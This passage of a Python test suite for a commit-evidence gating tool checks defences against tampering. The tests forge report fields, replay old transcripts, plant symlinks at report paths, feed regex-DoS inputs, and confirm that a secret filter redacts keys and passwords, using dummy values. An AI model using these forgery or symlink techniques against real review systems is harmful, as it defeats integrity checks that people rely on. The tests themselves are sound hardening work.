        run(["attest", "--tests"], self.repo)  # inheritance re-bind
        sha2 = self.git_out(["rev-parse", "HEAD"])
        with open(os.path.join(self.repo, ".coverloop", "reports", f"{sha2}.json")) as f:
            rep2 = json.load(f)
        self.assertEqual(rep2["codex"]["source"], "self-attested")  # dropped, not copied
        self.assertFalse(os.path.exists(
            os.path.join(self.repo, ".coverloop", "reports", f"{sha2}.codex.log")))

    def test_invalid_report_tier_fails_closed(self):
        """Codex v2.7 review: a garbage risk_tier must fail closed, not be
        ignored by tier_max and gated as the pinned --min-tier."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["risk_tier"] = "L9"
        with open(p, "w") as f:
            json.dump(rep, f)
        self.assertEqual(run(["gate", "--min-tier", "L0"], self.repo).returncode, 1)
        self.assertEqual(run(["gate", "--tier", "L2"], self.repo).returncode, 1)

    # attached transcripts (v2.7.1) ----------------------------------
    def test_attached_log_satisfies_require_captured(self):
        """v2.7.1: attach an EXISTING reviewer transcript (--codex-log) — no
        re-run — and --require-captured accepts it (committed + hash-bound)."""
        self.init_project()
        self.write("review.txt", "Codex review of app.py:1 — checked callers. CLEAN.\n")
        r = run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
                 "--codex-log", os.path.join(self.repo, "review.txt")], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr)
        sha = self.git_out(["rev-parse", "HEAD"])
        self.assertTrue(os.path.exists(
            os.path.join(self.repo, ".coverloop", "reports", f"{sha}.codex.log")))
        code, out = self.gate_json(["--require-captured"])
        self.assertEqual(code, 0, out)
        self.assertIn("attached", json.dumps(out))

    def test_attached_log_is_secret_redacted(self):
        """The privacy rule applies to attached transcripts exactly as to
        captured ones — secret values never reach a committed file."""
        self.init_project()
        key = "sk-" + "or-v1-abcdef0123456789abcdef0123456789"
        self.write("review.txt", f"reviewer saw OPENROUTER_API_KEY={key}\n")
        run(["attest", "--tier", "L2", "--codex", "pass",
             "--codex-log", os.path.join(self.repo, "review.txt")], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        with open(os.path.join(self.repo, ".coverloop", "reports", f"{sha}.codex.log")) as f:
            content = f.read()
        self.assertNotIn(key, content)
        self.assertIn("REDACTED", content)

    def test_attached_log_tamper_is_rejected(self):
        """An attached transcript is hash-bound: editing the committed log after
        attest invalidates the evidence outright (the label must never lie)."""
        self.init_project()
        self.write("review.txt", "CLEAN.\n")
        run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
             "--codex-log", os.path.join(self.repo, "review.txt")], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        self.write(f".coverloop/reports/{sha}.codex.log", "totally different\n")
        self.assertEqual(run(["gate"], self.repo).returncode, 1)

    def test_attach_symlink_source_is_rejected(self):
        self.init_project()
        self.write("real.txt", "CLEAN\n")
        os.symlink(os.path.join(self.repo, "real.txt"),
                   os.path.join(self.repo, "link.txt"))
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-log", os.path.join(self.repo, "link.txt")], self.repo)
        self.assertEqual(r.returncode, 2)

    def test_attach_requires_a_verdict(self):
        self.init_project()
        self.write("review.txt", "CLEAN\n")
        r = run(["attest", "--tier", "L2",
                 "--codex-log", os.path.join(self.repo, "review.txt")], self.repo)
        self.assertEqual(r.returncode, 2)

    def test_attach_and_run_are_mutually_exclusive(self):
        self.init_project()
        self.write("review.txt", "CLEAN\n")
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-run", "echo hi",
                 "--codex-log", os.path.join(self.repo, "review.txt")], self.repo)
        self.assertEqual(r.returncode, 2)

    def test_attach_empty_transcript_is_rejected(self):
        self.init_project()
        self.write("review.txt", "   \n")
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-log", os.path.join(self.repo, "review.txt")], self.repo)
        self.assertEqual(r.returncode, 2)

    def test_attach_oversized_file_is_rejected(self):
        self.init_project()
        self.write("big.txt", "x" * (5 * 1024 * 1024 + 1))
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-log", os.path.join(self.repo, "big.txt")], self.repo)
        self.assertEqual(r.returncode, 2)

    def test_attached_survives_attest_after_evidence_commit(self):
        """Inheritance re-binds attached logs exactly like captured ones."""
        self.init_project()
        self.write("review.txt", "CLEAN per file:line.\n")
        run(["attest", "--tier", "L2", "--codex", "pass",
             "--codex-log", os.path.join(self.repo, "review.txt")], self.repo)
        os.remove(os.path.join(self.repo, "review.txt"))  # keep the diff evidence-only
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence"], self.repo)
        run(["attest", "--tests"], self.repo)  # inherits codex + re-binds its log
        code, out = self.gate_json(["--require-captured"])
        self.assertEqual(code, 0, out)

    def test_attach_refuses_source_inside_reports_dir(self):
        """Codex v2.7.1 review #1: attaching the gate's own artifacts would
        launder a withheld failed-run log (or replay an old commit's log) into
        fresh 'attached' evidence — refuse any source under reports/."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
             "--codex-run", "echo auth failed; exit 7"], self.repo)
        self.assertEqual(run(["gate", "--require-captured"], self.repo).returncode, 1)
        sha = self.git_out(["rev-parse", "HEAD"])
        r = run(["attest", "--codex", "pass", "--codex-log",
                 os.path.join(self.repo, ".coverloop", "reports", f"{sha}.codex.log")],
                self.repo)
        self.assertEqual(r.returncode, 2)
        self.assertEqual(run(["gate", "--require-captured"], self.repo).returncode, 1)

    def test_attach_refuses_withheld_placeholder_content(self):
        """Codex v2.7.1 review #1b: a copy of the withheld failed-run
        placeholder is not a review transcript, wherever it lives."""
        self.init_project()
        self.write("copy.txt", "[codex reviewer command exited 7; transcript "
                               "withheld — a failed run is not valid evidence]\n")
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-log", os.path.join(self.repo, "copy.txt")], self.repo)
        self.assertEqual(r.returncode, 2)

    def test_forged_attached_source_with_exit_code_rejected(self):
        """Codex v2.7.1 review #2: hand-editing a FAILED captured entry's source
        to 'attached' must not dodge the exit-code check."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
             "--codex-run", "echo boom; exit 7"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["codex"]["source"] = "attached"
        with open(p, "w") as f:
            json.dump(rep, f)
        self.assertEqual(run(["gate", "--require-captured"], self.repo).returncode, 1)
        self.assertEqual(run(["gate"], self.repo).returncode, 1)  # label must never lie

    def test_forged_attached_without_exec_fields_still_rejected(self):
        """Codex v2.7.1 verify #1: reclassifying a FAILED capture as 'attached'
        AND deleting exit_code/command/ran_at must still fail — the committed
        log is the withheld placeholder, and placeholder content is rejected."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
             "--codex-run", "echo boom; exit 7"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["codex"]["source"] = "attached"
        for k in ("exit_code", "command", "ran_at"):
            rep["codex"].pop(k, None)
        with open(p, "w") as f:
            json.dump(rep, f)
        self.assertEqual(run(["gate", "--require-captured"], self.repo).returncode, 1)
        self.assertEqual(run(["gate"], self.repo).returncode, 1)

    def test_attach_reports_dir_case_variant_rejected(self):
        """Codex v2.7.1 verify #2: on a case-insensitive filesystem (macOS),
        '.COVERLOOP/REPORTS/<old>.codex.log' must not dodge the reports-dir
        guard — directory identity, not string prefix, decides."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
             "--codex-run", "echo clean"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        upper = os.path.join(self.repo, ".COVERLOOP", "REPORTS", f"{sha}.codex.log")
        if not os.path.isfile(upper):
            self.skipTest("case-sensitive filesystem — the string guard already covers this")
        r = run(["attest", "--codex", "pass", "--codex-log", upper], self.repo)
        self.assertEqual(r.returncode, 2)

    def test_inheritance_rejects_replayed_old_log(self):
        """Codex v2.7.1 verify #3: a forged ANCESTOR report pointing
        output_file at an OLD commit's clean log must not be laundered into
        evidence for the new HEAD by the inheritance re-bind — the transcript
        must verify against the ancestor itself first."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
             "--codex-run", "echo clean"], self.repo)
        c1 = self.git_out(["rev-parse", "HEAD"])
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence for c1"], self.repo)
        c2 = self.git_out(["rev-parse", "HEAD"])
        # forge a report for c2 whose codex evidence points at c1's log
        with open(os.path.join(self.repo, ".coverloop", "reports", f"{c1}.codex.log"), "rb") as f:
            old_hash = hashlib.sha256(f.read()).hexdigest()
        forged = {
            "schema": "coverloop-report/v1", "commit": c2, "risk_tier": "L2",
            "created_at": "2026-01-01T00:00:00Z",
            "tests": None,
            "codex": {"status": "pass", "findings_open": 0, "source": "captured",
                      "exit_code": 0, "recorded_at": "2026-01-01T00:00:00Z",
                      "output_file": f".coverloop/reports/{c1}.codex.log",
                      "output_sha256": old_hash},
            "glm": None, "human_gate": None,
        }
        self.write(f".coverloop/reports/{c2}.json", json.dumps(forged))
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "forged evidence"], self.repo)
        c3 = self.git_out(["rev-parse", "HEAD"])
        r = run(["attest", "--tests"], self.repo)  # inherits from the forged c2 report
        self.assertEqual(r.returncode, 0, r.stderr)
        # the replayed transcript must NOT have been re-bound to c3
        code, out = self.gate_json(["--require-captured"])
        self.assertEqual(code, 1, out)
        self.assertFalse(os.path.exists(
            os.path.join(self.repo, ".coverloop", "reports", f"{c3}.codex.log")))

    def test_attach_decode_expansion_past_cap_rejected(self):
        """Codex v2.7.1 review #3: errors='replace' can 3x raw bytes (U+FFFD) —
        a source at the cap must not commit a 15MB artifact."""
        self.init_project()
        with open(os.path.join(self.repo, "bomb.bin"), "wb") as f:
            f.write(b"\xff" * (4 * 1024 * 1024))
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-log", os.path.join(self.repo, "bomb.bin")], self.repo)
        self.assertEqual(r.returncode, 2)
        sha = self.git_out(["rev-parse", "HEAD"])
        self.assertFalse(os.path.exists(
            os.path.join(self.repo, ".coverloop", "reports", f"{sha}.codex.log")))



    # v2.7.2 ---------------------------------------------------------
    def test_failed_reviewer_capture_fails_attest_exit_code(self):
        """v2.7.2 (Codex parity assessment): a failed --codex-run reviewer
        already produced rejected evidence, but attest exited 0 — automation
        read a failed review as a successful attestation. Now exits 1."""
        self.init_project()
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-run", "echo boom; exit 7"], self.repo)
        self.assertEqual(r.returncode, 1)
        sha = self.git_out(["rev-parse", "HEAD"])
        self.assertTrue(os.path.exists(
            os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")))

    def test_pii_is_redacted_in_committed_transcripts(self):
        """v2.7.2: home-dir usernames, emails, and UUID session ids never
        reach a committed transcript (a live transcript had committed a real
        home path — Codex parity-assessment finding)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--codex", "pass", "--codex-run",
             "echo review by /Users/danielsecret/proj mail alice@example.com "
             "session 12345678-abcd-4ef0-9876-0123456789ab"], self.repo)
        content = self._read_log()
        self.assertNotIn("danielsecret", content)
        self.assertNotIn("alice@example.com", content)
        self.assertNotIn("12345678-abcd", content)
        self.assertIn("[REDACTED:user]", content)
        self.assertIn("[REDACTED:email]", content)
        self.assertIn("[REDACTED:uuid]", content)

    def test_pii_user_edge_cases(self):
        """Sol v2.7.2 review #2: single-char + underscore-leading usernames are
        caught, and a long username can't leak its tail past a length cap."""
        import glm_secret_filter as f
        self.assertEqual(f.redact("/home/x/p"), "/home/[REDACTED:user]/p")
        self.assertEqual(f.redact("/home/_svc/p"), "/home/[REDACTED:user]/p")
        long = "/Users/" + "a" * 60 + "/p"
        out = f.redact(long)
        self.assertNotIn("a" * 40, out)
        self.assertEqual(out, "/Users/[REDACTED:user]/p")

    def test_require_transcript_and_deprecated_alias_agree(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests", "--codex", "pass"], self.repo)
        self.assertEqual(run(["gate", "--require-transcript"], self.repo).returncode, 1)
        self.assertEqual(run(["gate", "--require-captured"], self.repo).returncode, 1)
        self.assertEqual(run(["gate"], self.repo).returncode, 0)

    def test_require_executed_rejects_attached_accepts_captured(self):
        """--require-executed is the strict tier: attached transcripts satisfy
        --require-transcript but NOT --require-executed; a real captured run
        satisfies both."""
        self.init_project()
        self.write("review.txt", "Reviewed app.py:1 CLEAN.\n")
        run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
             "--codex-log", os.path.join(self.repo, "review.txt")], self.repo)
        self.assertEqual(run(["gate", "--require-transcript"], self.repo).returncode, 0)
        self.assertEqual(run(["gate", "--require-executed"], self.repo).returncode, 1)
        run(["attest", "--codex", "pass",
             "--codex-run", "echo verified app.py:1 CLEAN"], self.repo)
        self.assertEqual(run(["gate", "--require-executed"], self.repo).returncode, 0)

    def test_require_executed_rejects_relabeled_attached(self):
        """Sol v2.7.2 review #1: an attached entry hand-relabeled
        source=captured + exit_code:0 (but lacking capture-only command/ran_at)
        must NOT satisfy --require-executed."""
        self.init_project()
        self.write("review.txt", "Reviewed app.py:1 CLEAN.\n")
        run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
             "--codex-log", os.path.join(self.repo, "review.txt")], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        rep = json.load(open(p))
        rep["codex"]["source"] = "captured"
        rep["codex"]["exit_code"] = 0
        json.dump(rep, open(p, "w"))
        self.assertEqual(run(["gate", "--require-executed"], self.repo).returncode, 1)
        self.assertEqual(run(["gate"], self.repo).returncode, 1)  # label now inconsistent

    def test_init_gitignore_defeats_root_log_ignore(self):
        """Field report 2026-07-10 #3: a repo-root `*.log` rule must not
        swallow committed evidence — init's negations re-include reports/."""
        self.write(".gitignore", "*.log\n")
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "ignore logs"], self.repo)
        self.init_project()
        r = run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
                 "--codex-run", "echo reviewed app.py:1 CLEAN"], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr)
        sha = self.git_out(["rev-parse", "HEAD"])
        chk = subprocess.run(["git", "check-ignore",
                              f".coverloop/reports/{sha}.codex.log"],
                             cwd=self.repo, capture_output=True, text=True)
        self.assertEqual(chk.returncode, 1)  # NOT ignored

    def test_attest_fails_when_evidence_gitignored(self):
        """Same trap on an OLD install (comment-only .coverloop/.gitignore):
        attest must fail loudly instead of writing unshippable evidence."""
        self.write(".gitignore", "*.log\n")
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "ignore logs"], self.repo)
        self.init_project()
        self.write(".coverloop/.gitignore", "# old install, no negations\n")
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-run", "echo reviewed app.py:1 CLEAN"], self.repo)
        self.assertEqual(r.returncode, 1)
        self.assertIn("IGNORES", r.stderr)

    def test_advisor_clis_answer_help_without_model_call(self):
        """v2.7.2: --help must print usage and exit 0 BEFORE any parsing —
        previously glm-review treated '--help' as review text."""
        for cli in ("glm-review", "m3-review"):
            path = os.path.join(os.path.dirname(CLI), cli)
            r = subprocess.run([sys.executable, path, "--help"],
                               capture_output=True, text=True, timeout=30)
            self.assertEqual(r.returncode, 0, f"{cli}: {r.stderr}")
            self.assertIn("usage:", r.stdout)


    # ---- full audit 2026-07-11 (v2.7.3) regressions ----
    def test_laundered_failed_capture_rejected_source_agnostic(self):
        """P1: a FAILED captured run (log = withheld placeholder) must not pass
        by hand-editing exit_code 1->0 — the withheld-marker check is now
        source-agnostic, so a re-hash-free forge is rejected for captured too."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
             "--codex-run", "echo boom; exit 7"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        rep = json.load(open(p))
        rep["codex"]["exit_code"] = 0            # the single un-hashed edit
        json.dump(rep, open(p, "w"))
        self.assertEqual(run(["gate", "--require-executed"], self.repo).returncode, 1)
        self.assertEqual(run(["gate"], self.repo).returncode, 1)

    def test_secret_filter_catches_bare_KEY_family(self):
        """P1: AWS_SECRET_ACCESS_KEY / SECRET_KEY / ENCRYPTION_KEY etc. must be
        scanned (egress-blocked) and redacted; MONKEY must not over-match."""
        import glm_secret_filter as f
        for name in ("AWS_SECRET_ACCESS_KEY", "SECRET_KEY", "ENCRYPTION_KEY",
                     "SIGNING_KEY", "PRIVATE_KEY"):
            self.assertTrue(f.scan(f"{name}=supersecretvalue123"), name)
            self.assertIn("REDACTED", f.redact(f"{name}=supersecretvalue123"), name)
        self.assertEqual(f.redact("MONKEY=banana"), "MONKEY=banana")

    def test_secret_filter_redacts_quoted_multiword_value(self):
        """P2: a quoted multi-word secret must redact to the closing quote, not
        leak its tail into the committed transcript."""
        import glm_secret_filter as f
        out = f.redact('PASSWORD="secret pass phrase"')
        self.assertNotIn("phrase", out)
        self.assertNotIn("pass ", out)
        self.assertIn("REDACTED", f.redact("TOKEN=x"))  # short value too

    def test_malformed_nondict_field_fails_closed(self):
        """P3: a schema-valid report whose codex/tests field is a non-dict must
        take the clean malformed-evidence FAIL path, not raise."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        rep = json.load(open(p))
        rep["codex"] = "passed"   # string, not an object
        json.dump(rep, open(p, "w"))
        r = run(["gate", "--min-tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)
        self.assertNotIn("Traceback", r.stderr)

    def test_require_clean_tree_flag_blocks_uncommitted_code(self):
        """P2 (opt-in): --require-clean-tree fails on uncommitted non-evidence
        edits; default gate is unaffected; report artifacts are carved out."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
             "--codex-run", "echo reviewed app.py:1 CLEAN"], self.repo)
        # default gate passes with the uncommitted report artifact present
        self.assertEqual(run(["gate", "--min-tier", "L2", "--require-transcript"],
                             self.repo).returncode, 0)
        # now dirty the tree with uncommitted CODE
        self.write("app.py", "print('edited after attest')\n")
        self.assertEqual(run(["gate", "--min-tier", "L2", "--require-transcript"],
                             self.repo).returncode, 0)  # default still passes
        self.assertEqual(run(["gate", "--min-tier", "L2", "--require-transcript",
                              "--require-clean-tree"], self.repo).returncode, 1)

    def test_tier_floor_folds_all_flags(self):
        """P2: a coexisting/lower --tier must not discard a higher --min-tier;
        every floor is folded via tier_max."""
        self.init_project()
        run(["attest", "--tier", "L1", "--tests"], self.repo)  # report says L1
        # L1 report + L1 tests would pass at L1, but a coexisting --min-tier L3
        # must RAISE to L3 (needs codex+glm+human, which are absent) -> FAIL
        r = run(["gate", "--min-tier", "L3", "--tier", "L0"], self.repo)
        self.assertEqual(r.returncode, 1)
        code, out = self.gate_json(["--min-tier", "L3", "--tier", "L0"])
        self.assertEqual(out["tier"], "L3")


    # ---- Sol v2.7.3 verify round-2 regressions ----
    def test_review_quoting_withheld_marker_still_passes(self):
        """Sol verify #1: a GENUINE captured review that merely QUOTES the
        withheld-marker string (e.g. reviewing coverloop's own source) must NOT
        be false-rejected — only the whole-line placeholder is rejected."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests", "--codex", "pass",
             "--codex-run", "printf 'Reviewed capture_run: it writes \"transcript withheld "
             "— a failed run is not valid evidence]\" on failure. app.py:1 CLEAN'"], self.repo)
        code, out = self.gate_json(["--min-tier", "L2", "--require-executed"])
        self.assertEqual(code, 0, out)

    def test_open_write_refuses_symlink_destination(self):
        """Sol verify #2: a pre-planted symlink at the report path must not be
        written through (portable islink guard, works even without O_NOFOLLOW)."""
        self.init_project()
        outside = os.path.join(self.tmp.name, "victim.txt")
        with open(outside, "w") as f:
            f.write("original\n")
        sha = self.git_out(["rev-parse", "HEAD"])
        os.makedirs(os.path.join(self.repo, ".coverloop", "reports"), exist_ok=True)
        link = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        os.symlink(outside, link)
        r = run(["attest", "--tier", "L1", "--tests"], self.repo)
        self.assertEqual(r.returncode, 2)   # refused
        with open(outside) as f:
            self.assertEqual(f.read(), "original\n")  # victim untouched

    def test_quoted_secret_with_inner_apostrophe(self):
        """Sol verify #3: a double-quoted secret containing an apostrophe must
        redact to the matching closing quote, not stop at the inner quote."""
        import glm_secret_filter as f
        out = f.redact('PASSWORD="correct horse\'s battery staple"')
        for leak in ("horse", "battery", "staple"):
            self.assertNotIn(leak, out)
        self.assertIn("REDACTED", out)


    # ---- Round-1 hardening (2026-07-11) regressions ----
    def test_open_write_refuses_symlinked_reports_dir(self):
        """Sol grade / security: a symlinked .coverloop/reports PARENT dir must
        not let an evidence write escape off-tree (parent-chain guard, not just
        the final component)."""
        self.init_project()
        # point .coverloop/reports at an outside dir via symlink
        victim = os.path.join(self.tmp.name, "outside")
        os.makedirs(victim, exist_ok=True)
        reports = os.path.join(self.repo, ".coverloop", "reports")
        import shutil
        shutil.rmtree(reports)
        os.symlink(victim, reports)
        r = run(["attest", "--tier", "L1", "--tests"], self.repo)
        self.assertEqual(r.returncode, 2)  # refused, not written off-tree
        self.assertEqual(os.listdir(victim), [])  # nothing escaped into the victim dir


    # ---- Round-2 schema validation (2026-07-11) ----
    def _forge_field(self, tier, field, value):
        self.init_project()
        run(["attest", "--tier", tier, "--tests"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        rep = json.load(open(p))
        # walk dotted field
        obj = rep
        keys = field.split(".")
        for k in keys[:-1]:
            obj = obj.setdefault(k, {})
        obj[keys[-1]] = value
        json.dump(rep, open(p, "w"))
        return run(["gate", "--min-tier", tier], self.repo)

    def test_bool_findings_open_is_rejected(self):
        """Sol R2: bool is an int subclass — findings_open: true must not
        masquerade as a count; malformed FAIL, no crash."""
        r = self._forge_field("L2", "codex", {"status": "pass", "findings_open": True})
        self.assertEqual(r.returncode, 1)
        self.assertNotIn("Traceback", r.stderr)

    def test_bad_status_string_is_rejected(self):
        r = self._forge_field("L2", "codex", {"status": "maybe", "findings_open": 0})
        self.assertEqual(r.returncode, 1)
        self.assertNotIn("Traceback", r.stderr)

    def test_nonstring_approver_is_rejected(self):
        r = self._forge_field("L3", "human_gate", {"approved": True, "approver": 123})
        self.assertEqual(r.returncode, 1)
        self.assertNotIn("Traceback", r.stderr)

    def test_nonbool_approved_is_rejected(self):
        r = self._forge_field("L3", "human_gate", {"approved": "yes", "approver": "daniel"})
        self.assertEqual(r.returncode, 1)
        self.assertNotIn("Traceback", r.stderr)

    def test_string_human_gate_fails_clean(self):
        """GLM R2 §4.3: the nested `"approved" in hg` check would be a SUBSTRING
        test if hg were a string ("approved_by_bob" -> True -> hg["approved"]
        TypeError). The shape guard (human_gate must be an object) must catch it
        FIRST -> clean malformed FAIL, never a traceback. Locks that guarantee."""
        r = self._forge_field("L3", "human_gate", "approved_by_bob")
        self.assertEqual(r.returncode, 1)
        self.assertNotIn("Traceback", r.stderr)

    def test_list_human_gate_fails_clean(self):
        """Same guard for a list containing 'approved' (membership True, then
        hg['approved'] TypeError without the shape guard)."""
        r = self._forge_field("L3", "human_gate", ["approved"])
        self.assertEqual(r.returncode, 1)
        self.assertNotIn("Traceback", r.stderr)


    def test_regexes_are_redos_bounded(self):
        """R2: every matcher on the egress path (scan) and commit path (redact)
        must run in ~linear time on adversarial input — a DoS here stalls the
        privacy filter itself. Covers all three known amplification shapes:
          1. private-key BEGIN marker with no END (the .{0,10000}? bound),
          2. a 2 MB word-char run before ASSIGN_RE's required suffix (the real
             ReDoS this test first surfaced: `\\b` + {0,64} make it linear —
             the unbounded `[A-Za-z0-9_]*` version hung for minutes here),
          3. word-boundary spam (a boundary every few chars) — worst case for
             the {0,64} per-boundary bound.
        Ceiling is generous (2s each) to avoid CI flakiness; the vulnerable
        forms exceed it by orders of magnitude."""
        import glm_secret_filter as f, time
        cases = {
            "privkey_no_end": "-----BEGIN RSA PRIVATE KEY-----\n" + ("A" * 2_000_000),
            "word_run_assign": ("A" * 2_000_000) + "=x",
            "boundary_spam": "KEYX " * 400_000,
        }
        for name, blob in cases.items():
            t0 = time.monotonic()
            f.scan(blob)
            f.redact(blob)
            dt = time.monotonic() - t0
            self.assertLess(dt, 2.0, "%s scanned in %.2fs (ReDoS?)" % (name, dt))

    def test_assign_redaction_still_correct_after_redos_fix(self):
        """The `\\b` ReDoS hardening must not narrow what ASSIGN_RE catches:
        names ending in a secret keyword, mid-line and after punctuation, still
        redact; MONKEY= (no separator) still does not."""
        import glm_secret_filter as f
        for s in ("X_API_KEY=abc", "SECRET_KEY=abc", "DB_PASSWORD=p",
                  "foo;TOKEN=t", ",API_KEY=k", 'PASSWORD="secret pass phrase"'):
            self.assertIn("[REDACTED", f.redact(s), "should redact: %r" % s)
            self.assertTrue(f.scan(s), "should flag: %r" % s)
        self.assertEqual(f.redact("MONKEY=banana"), "MONKEY=banana")

    def test_long_prefix_name_still_redacts(self):
        """Regression (Sol/GLM R2): a bounded `{0,64}` prefix silently STOPPED
        redacting a secret whose name has 65+ word chars before the keyword
        (the `\\b` anchor blocks restarting mid-identifier), leaking it into
        committed transcripts. The prefix is unbounded on purpose — `\\b` alone
        keeps it linear. Names far longer than any real one must still redact."""
        import glm_secret_filter as f
        for n in (65, 200, 5000):
            s = ("A" * n) + "_KEY=hunter2"
            self.assertNotIn("hunter2", f.redact(s),
                             "%d-char-prefix secret leaked" % n)
            self.assertTrue(f.scan(s), "%d-char-prefix secret not flagged" % n)

    # ---- R3: commit-signature provenance (--require-signed-commit) ----
    def test_signed_commit_not_required_by_default(self):
        """Opt-in: an unsigned commit still gates PASS without the flag — the
        provenance check must never change the default path."""
        self.init_project()
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        r = run(["gate", "--min-tier", "L1"], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr + r.stdout)

    def test_require_signed_commit_fails_on_unsigned(self):
        """With the flag, an unsigned HEAD fails with a clean 'signature' check —
        no traceback, and the verdict is FAIL."""
        self.init_project()
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        r = run(["gate", "--min-tier", "L1", "--require-signed-commit"], self.repo)
        self.assertEqual(r.returncode, 1, r.stderr + r.stdout)
        self.assertNotIn("Traceback", r.stderr)
        self.assertIn("signature", (r.stdout + r.stderr).lower())

    def test_require_signed_commit_exempt_at_L0(self):
        """L0 needs no evidence; a signature gate on a no-op would be noise, so
        --require-signed-commit is a no-op at L0 (still PASS while unsigned)."""
        self.init_project()
        r = run(["gate", "--min-tier", "L0", "--require-signed-commit"], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr + r.stdout)

    def test_require_signed_commit_passes_when_ssh_signed(self):
        """Positive path: an SSH-signed HEAD that git can verify passes the
        provenance gate. Skips where ssh-keygen or git ssh-signing is absent."""
        import shutil
        if not shutil.which("ssh-keygen"):
            self.skipTest("ssh-keygen unavailable")
        key = os.path.join(self.tmp.name, "id_ed25519")
        kg = subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", key, "-q"],
                            capture_output=True, text=True)
        if kg.returncode != 0:
            self.skipTest("ssh-keygen failed: %s" % kg.stderr)
        pub = open(key + ".pub").read().strip()
        email = "t@example.com"  # matches setUp's git user.email
        allowed = os.path.join(self.tmp.name, "allowed_signers")
        with open(allowed, "w") as fh:
            fh.write("%s %s\n" % (email, pub))
        # signingkey = PRIVATE key path (universally accepted for ssh signing;
        # some git versions don't strip a `.pub` — GLM R3 P2-3)
        for cfg in (["gpg.format", "ssh"], ["user.signingkey", key],
                    ["gpg.ssh.allowedSignersFile", allowed]):
            sh(["git", "config"] + cfg, self.repo)
        self.init_project()
        # a signed code commit becomes HEAD, then attest binds evidence to it
        self.write("feature.py", "print('signed')\n")
        sh(["git", "add", "-A"], self.repo)
        signed = subprocess.run(["git", "commit", "-S", "-qm", "signed change"],
                                cwd=self.repo, capture_output=True, text=True)
        if signed.returncode != 0:
            self.skipTest("git ssh-signing unsupported here: %s" % signed.stderr)
        # sanity: git must report a GOOD, TRUSTED signature (%G? == G), else the
        # environment can't produce the trusted state the gate requires
        gq = subprocess.run(["git", "log", "-1", "--format=%G?", "HEAD"], cwd=self.repo,
                            capture_output=True, text=True)
        if gq.stdout.strip() != "G":
            self.skipTest("git ssh trust not functional here: %G?=%r" % gq.stdout.strip())
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        r = run(["gate", "--min-tier", "L1", "--require-signed-commit"], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr + r.stdout)
        self.assertIn("signature", (r.stdout + r.stderr).lower())

    def test_require_signed_commit_rejects_untrusted_key(self):
        """Sol R3 P1 / GLM top gap: a commit signed by a key git can't VALIDATE
        (good signature but signer NOT in allowed_signers -> %G? == 'U') must
        FAIL the gate. Requiring only exit-0 of `git verify-commit` would wrongly
        accept it. This is the core promise of the provenance gate."""
        import shutil
        if not shutil.which("ssh-keygen"):
            self.skipTest("ssh-keygen unavailable")
        key = os.path.join(self.tmp.name, "id_ed25519")
        if subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", key, "-q"],
